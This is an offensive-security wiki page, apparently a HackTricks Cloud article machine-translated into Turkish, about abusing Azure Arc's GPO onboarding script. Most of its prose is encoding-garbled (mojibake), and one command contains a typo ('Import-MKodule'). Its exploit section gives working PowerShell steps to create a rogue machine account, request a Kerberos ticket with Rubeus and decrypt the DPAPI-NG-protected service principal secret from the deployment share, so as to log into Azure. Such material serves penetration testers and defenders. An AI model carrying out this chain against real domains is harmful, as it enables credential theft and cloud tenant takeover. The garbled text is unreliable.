# Az - Arc vulnerable GPO Deploy Script

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Identifying the Issues

Azure Arc, yeni iÃ§ sunucularÄ±n (katÄ±lmÄ±ÅŸ alan sunucularÄ±) Azure Arc'a Grup Politika Nesnesi yÃ¶ntemiyle entegrasyonuna olanak tanÄ±r. Bunu kolaylaÅŸtÄ±rmak iÃ§in Microsoft, onboarding prosedÃ¼rÃ¼nÃ¼ baÅŸlatmak iÃ§in gerekli olan bir daÄŸÄ±tÄ±m araÃ§ seti saÄŸlar. ArcEnableServerGroupPolicy.zip dosyasÄ±nÄ±n iÃ§inde ÅŸu betikler bulunur: DeployGPO.ps1, EnableAzureArc.ps1 ve AzureArcDeployment.psm1.

DeployGPO.ps1 betiÄŸi Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, aÅŸaÄŸÄ±daki iÅŸlemleri gerÃ§ekleÅŸtirir:

1. Yerel alanda Azure Arc SunucularÄ± Onboarding GPO'sunu oluÅŸturur.
2. EnableAzureArc.ps1 onboarding betiÄŸini, onboarding sÃ¼reci iÃ§in oluÅŸturulan belirlenen aÄŸ paylaÅŸÄ±mÄ±na kopyalar; bu paylaÅŸÄ±m ayrÄ±ca Windows yÃ¼kleyici paketini de iÃ§erir.

Bu betiÄŸi Ã§alÄ±ÅŸtÄ±rÄ±rken, sistem yÃ¶neticileri iki ana parametre saÄŸlamalÄ±dÄ±r: **ServicePrincipalId** ve **ServicePrincipalClientSecret**. AyrÄ±ca, alan, paylaÅŸÄ±mÄ± barÄ±ndÄ±ran sunucunun FQDN'si ve paylaÅŸÄ±m adÄ± gibi diÄŸer parametreler de gereklidir. KiracÄ± kimliÄŸi, kaynak grubu ve diÄŸer gerekli bilgilerin de betiÄŸe saÄŸlanmasÄ± gerekir.

Belirtilen paylaÅŸÄ±mda AzureArcDeploy dizininde DPAPI-NG ÅŸifrelemesi kullanÄ±larak ÅŸifrelenmiÅŸ bir gizli anahtar oluÅŸturulur. ÅifrelenmiÅŸ gizli anahtar, encryptedServicePrincipalSecret adlÄ± bir dosyada saklanÄ±r. Bunun kanÄ±tÄ±, DeployGPO.ps1 betiÄŸinde, ÅŸifrelemenin $descriptor ve $ServicePrincipalSecret girdileri ile ProtectBase64 Ã§aÄŸrÄ±larak gerÃ§ekleÅŸtirildiÄŸi yerde bulunabilir. TanÄ±mlayÄ±cÄ±, Alan BilgisayarÄ± ve Alan Denetleyici grup SID'lerinden oluÅŸur ve bu, ServicePrincipalSecret'Ä±n yalnÄ±zca Alan Denetleyicileri ve Alan BilgisayarlarÄ± gÃ¼venlik gruplarÄ± tarafÄ±ndan ÅŸifresinin Ã§Ã¶zÃ¼lebileceÄŸini garanti eder; bu, betik yorumlarÄ±nda belirtilmiÅŸtir.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Exploit

AÅŸaÄŸÄ±daki koÅŸullara sahibiz:

1. Ä°Ã§ aÄŸa baÅŸarÄ±yla sÄ±zdÄ±k.
2. Active Directory iÃ§inde bir bilgisayar hesabÄ± oluÅŸturma veya kontrol etme yeteneÄŸine sahibiz.
3. AzureArcDeploy dizinini iÃ§eren bir aÄŸ paylaÅŸÄ±mÄ±nÄ± keÅŸfettik.

AD ortamÄ±nda bir makine hesabÄ± elde etmenin birkaÃ§ yÃ¶ntemi vardÄ±r. En yaygÄ±n olanlardan biri makine hesabÄ± kotasÄ±nÄ± istismar etmektir. DiÄŸer bir yÃ¶ntem, savunmasÄ±z ACL'ler veya Ã§eÅŸitli diÄŸer yanlÄ±ÅŸ yapÄ±landÄ±rmalar aracÄ±lÄ±ÄŸÄ±yla bir makine hesabÄ±nÄ± tehlikeye atmaktÄ±r.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Bir makine hesabÄ± elde edildikten sonra, bu hesapla kimlik doÄŸrulamak mÃ¼mkÃ¼ndÃ¼r. Ya netonly bayraÄŸÄ± ile runas.exe komutunu kullanabiliriz ya da Rubeus.exe ile pass-the-ticket yÃ¶ntemini kullanabiliriz.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Bellek iÃ§inde bilgisayar hesabÄ±mÄ±z iÃ§in TGT'ye sahip olarak, hizmet ilkesi gizli anahtarÄ±nÄ± ÅŸifre Ã§Ã¶zmek iÃ§in aÅŸaÄŸÄ±daki betiÄŸi kullanabiliriz.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternatif olarak, [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG) kullanabiliriz.

Bu noktada, ÅŸifrelenmiÅŸServicePrincipalSecret dosyasÄ±yla aynÄ± aÄŸ paylaÅŸÄ±mÄ±nda saklanan ArcInfo.json dosyasÄ±ndan Azure'a baÄŸlanmak iÃ§in gereken kalan bilgileri toplayabiliriz. Bu dosya, TenantId, servicePrincipalClientId, ResourceGroup ve daha fazlasÄ± gibi ayrÄ±ntÄ±larÄ± iÃ§erir. Bu bilgilerle, tehlikeye atÄ±lmÄ±ÅŸ hizmet ilkesi olarak kimlik doÄŸrulamak iÃ§in Azure CLI'yi kullanabiliriz.

## Referanslar

* [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.**

</details>
{% endhint %}
